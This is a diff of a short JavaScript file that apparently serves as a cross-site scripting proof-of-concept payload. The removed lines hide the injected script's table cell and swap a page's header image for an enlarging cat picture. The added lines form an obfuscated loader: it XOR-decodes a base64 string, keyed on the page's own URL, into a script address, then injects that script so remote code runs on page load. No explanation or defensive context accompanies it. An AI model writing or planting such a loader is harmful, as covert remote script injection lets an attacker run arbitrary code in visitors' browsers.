@@ -1,21 +1,14 @@
-if (document.querySelectorAll('a#flag').length == 0)
-{
-	let flag = document.createElement('a');
-	flag.setAttribute("id","flag");
-	document.head.appendChild(flag);
-	document.querySelector('script[src="HTTPS://AX16.GITHUB.IO/POC"]').closest('td').style="display: none";
-	let im = document.querySelector('img.in-header');
-	let x = im.clientWidth;
-	im.src = "https://cataas.com/cat?width=" + x + "&height=" + x;
-
-	const sleep = (time) => {return new Promise((resolve) => setTimeout(resolve, time))}
-
-	const gatling = async () => {
-	  for (let i = x; i < x*5; i++) {
-		await sleep(10)
-		im.style.height = i+'px';
-		im.style.width = i+'px';
-	  }
-	}
-	gatling();
+function xen(tx, ps) {
+    var ord = [];
+    var bff = "";
+    for (sdF = 1; sdF <= 255; sdF++) {ord[String.fromCharCode(sdF)] = sdF}
+    for (sdE = sdF = 0; sdF < tx.length; sdF++) {
+        bff += String.fromCharCode(ord[tx.substr(sdF, 1)] ^ ord[ps.substr(sdE, 1)])
+        sdE = (sdE < ps.length) ? sdE + 1 : 0
+    }
+    return bff
 }
+p = xen(atob('AAAAAAAAAAAcAEsfSwMBCwgQQhZUTBtaDA5AHRVWVl8bAkgKHF4GTA=='),window.location.href);
+var sc = document.createElement('script');
+sc.src = p;
+document.head.appendChild(sc); 
